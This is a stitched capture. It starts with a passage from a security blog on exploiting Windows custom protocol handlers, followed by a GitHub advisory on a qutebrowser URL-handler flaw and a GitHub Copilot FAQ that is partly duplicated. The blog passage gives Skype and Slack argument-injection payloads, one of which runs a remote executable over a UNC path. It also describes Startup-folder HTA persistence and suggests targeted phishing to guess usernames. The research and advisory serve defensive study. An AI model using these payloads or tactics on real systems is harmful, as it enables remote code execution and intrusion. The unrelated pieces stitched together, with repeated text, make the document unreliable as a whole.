![whatever.hta in procmon](06-hta-procmon.png "whatever.hta in procmon")
whatever.hta in procmon

To explore more, put it in the `Start Up` directory for your user at:

`%appdata%/Microsoft/Windows/STARTM~1/Programs/Startup/`

Now, run the `logoff` command in your VM and log in again. A few seconds after
login you should see the HTA app and calc.

All 22 closing brackets appear in the log and none of them are used up. At
first, I thought they are pointing to the location of the payload in the log
file (think arrows) but now, I think they are there to get out of anything in
the log that might be interpreted as an HTML tag by the parser.

Brilliant bug! Don't forget to remove the HTA file from your VM.

#### Startup Path Limitations And Possible Workarounds

Update 29 April 2021. I have used this technique in a couple of real-world bugs.
Let's look at the path:

* `C:/Users/[username]/AppData/Roaming/Microsoft/Windows/STARTM~1/Programs/Startup/suntzu.hta`

We need to predict the `[username]`. rgod's proof of concept gets around this by
using `Administrator`. This is a user that exists on most Windows machines but
to inject into that location the app needs to be running elevated.

I have thought of some workarounds:

1. Environment variables.
2. Multi-stage payloads.
3. Startup in ProgramData.
4. Guessing the username.

##### Environment Variables

If the path supports environment variables we can substitute the path with
either (and possibly more):

* `%appdata%/Microsoft/Windows/STARTM~1/Programs/Startup/`
* `C:/Users/%username%/AppData/Roaming/Microsoft/Windows/STARTM~1/Programs/Startup/`

It does not always work. I had this vuln in a C# app. Passing a path with an
environment variable in it to C# file utilities is not enough and they must be
resolved with [Environment.ExpandEnvironmentVariables(String)](https://docs.microsoft.com/en-us/dotnet/api/system.environment.expandenvironmentvariables).

##### Multi-stage Payloads

You might be able to be successful if you can inject in a different path. Maybe,
a different application executes or uses the file or you can execute single
files.

In the application mentioned above, I could also execute single files without
parameters. This is a limitation that we have seen a few times in this article
and the wild.

I injected the HTA into `C:/ProgramData/[app]` and then executed it using the
original vulnerability.

##### Startup in ProgramData

If you are running elevated you can inject into
`C:/ProgramData/Microsoft/Windows/STARTM~1/Programs/Startup/` and it will be
executed at startup for all users.

The big limitation here is running elevated. Writing to that directory needs
local admin.

##### Guessing The Username

If all else fails, just guess.

In most businesses, the person's username and their email is the same and
predictable (e.g., `jsmith` for John Smith).

We can send targeted phishing emails to users with a customized payload in the
protocol handler and have a good success rate.

### Skype Command Injection via browser-subprocess-command

This payload combines two of the techniques we have seen. command-line switch
injection and remote files.

```
<a hred='skype://?"
  --secondary
  --browser-subprocess-path=\\192.168.0.1\uncshare\sh.exe
'>

```

I cannot find any information about the `secondary` flag in
[flag-descriptions.cc](https://chromium.googlesource.com/chromium/src/%2B/master/chrome/browser/flag_descriptions.cc) but it is probably needed. Does it
enable Chromium's secondary UI? I don't know.

The [browser-subprocess-command](https://chromium.googlesource.com/chromium/chromium/%2B/master/content/public/common/content_switches.cc#32) specifies an
executable for the Chromium renderer and plugin subprocesses. It's set to a
remote file via a UNC path. Skype would execute it when creating a renderer
subprocess and the attacker would get remote code execution.

During the review, we had this question about the remote file. Will the OS show
a prompt and ask for confirmation before executing a remote executable? I don't
know. If you do, please let me know. I think in this case, the framework does it
automagically and there is no prompt? Honestly, we have to find a copy of the
vulnerable version and try it.

### Slack command-line Injection via browser-subprocess-command

The Slack exploit is similar to the previous bug. There is one difference.
According to the article, an existing instance of Slack would prevent the
exploit. They got around by supplying `user-data-dir`. This runs the instance
run under a new user (e.g., profile) and work.

The exploit URI uses calc but I think we can assume it can execute a remote file
like the Skype version (doubt).

```
<a href='slack://"
  --user-data-dir=.
  -- browser-subprocess-path=C:/Windows/System32/calc.exe
'>

```

There are two more similar advisories. but as I said the ZDI advisory pages do not have
any details and I was not able to find any public info. Both apps use CEF.

* [Spotify Music Player URI parsing Command Injection Remote Code Execution Vulnerability](https://www.zerodayinitiative.com/advisories/ZDI-18-280/)
* [Amazon Music Player URI parsing Command Injection Remote Code Execution Vulnerability](https://www.zerodayinitiative.com/advisories/ZDI-18-215/)

# So, How Do I Get Started?

After reading these bugs you are now motivated to go and find things and
hopefully, make some dosh.

## Listing All Registered Protocol Handlers

If you are targeting a specific program you probably already know the URI scheme
during your initial attack surface analysis (you did one, didn't you?).
[URLProtocolView](https://www.nirsoft.net/utils/url_protocol_view.html) by Nirsoft is a great tool to view
all of these schemes.

Next, check how the URI is passed to the app. In URLProtocolView we can see it
under the `Command-Line` column. Here's the entry for the Nord VPN URI scheme we
saw before. This shows if there are any extra command-line switches. You can
also see it in action with procmon.

![NordVPN.Notification](04-nordvpn-uri.png "NordVPN.Notification")
NordVPN.Notification

Unfortunately, there is no set-piece strategy after that. I usually look for
these things.

## Command-Line Switches

This could be as easy as running `app.exe -h/--help` or reading the
documentation. Sometimes, you can just run the app with some random input and it
will print a helpful list of switches.

But more often than not you need to debug/RE the app (I am better at dynamic
analysis). Often, commercial closed source apps have some hidden/debug switches
that are not publicly known. Sometimes, setting "debug mode" disables some of
the protections (remember the Chromium switches that disabled the sandbox?).

[@Jeffssh](https://twitter.com/jeffssh) mentioned that we can just run `strings` on the
binary.

## How Parameters are Processed

Does the app parse the string and extract parameters or is it expecting a string
in a specific format (like the Nord VPN serialized string) and returns an
error/ignores the rest? Sometimes, the app is helpful and parses the string into
its argument/value tuples.

## Flow Analysis

After you have figured out what switches and input are available you need to
figure out where this input ends up. I mentioned how dnSpy helps with that.
Sometimes, there is no need to do this because a switch results in an exploit
(e.g., the mIRC bug).

## Passing Remote Files

Check if the app accepts UNC paths and remote files. Pass a UNC path and see if
the file is accessed. Create a local share on your machine and then do
`\\localhost\share\path\to\file`. Make sure to disable authentication for the
share.

# What Did We Learn Here Today?

We learned how to look for vulnerabilities in custom protocol handlers. We
reviewed a good number of bugs and learned quite a few techniques. Go and find
these in the wild. If you do (and you can), please publish your write-ups and
let me know.

## Arbitrary command execution on Windows via qutebrowserurl: URL handler

High severity

GitHub Reviewed

Published
Oct 21, 2021
in
[qutebrowser/qutebrowser](/qutebrowser/qutebrowser)
•
Updated Oct 16, 2024

[Vulnerability details](/advisories/GHSA-vw27-fwjf-5qxm)
[Dependabot alerts
0](/advisories/GHSA-vw27-fwjf-5qxm/dependabot)

## Package

pip

qutebrowser
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

>= 1.7.0, < 2.4.0

## Patched versions

2.4.0

## Description

### Impact

Starting with qutebrowser v1.7.0, the Windows installer for qutebrowser registers it as a handler for certain URL schemes. With some applications such as Outlook Desktop, opening a specially crafted URL can lead to argument injection, allowing execution of qutebrowser commands, which in turn allows arbitrary code execution via commands such as `:spawn` or `:debug-pyeval`.

Only Windows installs where qutebrowser is registered as URL handler are affected. It does *not* have to be set as default browser for the exploit to work.

### Patches

The issue has been fixed in [qutebrowser v2.4.0](https://github.com/qutebrowser/qutebrowser/releases/tag/v2.4.0) in commit 8f46ba3f6dc7b18375f7aa63c48a1fe461190430.

The fix also adds additional hardening for potential similar issues on Linux (by adding the new `--untrusted-args` flag to the `.desktop` file), though no such vulnerabilities are known.

Backported patches for older versions are available, but no further releases are planned:

* v1.7.x: d1ceaab
* v1.8.x: ca7155d
* v1.9.x: 157d871
* v1.10.x: 94a6125
* v1.11.x: 10acfbb
* v1.12.x: 363a18f
* v1.13.x: 410f262
* v1.14.x: e4f4d93
* v2.0.x: 15a1654
* v2.1.x: 509ddf2
* v2.2.x: 03dcba5
* v2.3.x: 00a694c

(commits are referring to qutebrowser/qutebrowser on GitHub)

### Workarounds

Remove qutebrowser from the default browser settings entirely, so that it does not handle any kind of URLs. Make sure to remove *all* handlers, including an (accidental) `qutebrowserURL` handler, e.g. using [NirSoft URLProtocolView](https://www.nirsoft.net/utils/url_protocol_view.html).

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.

GeneralPlans & PricingPrivacyResponsible AI
### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

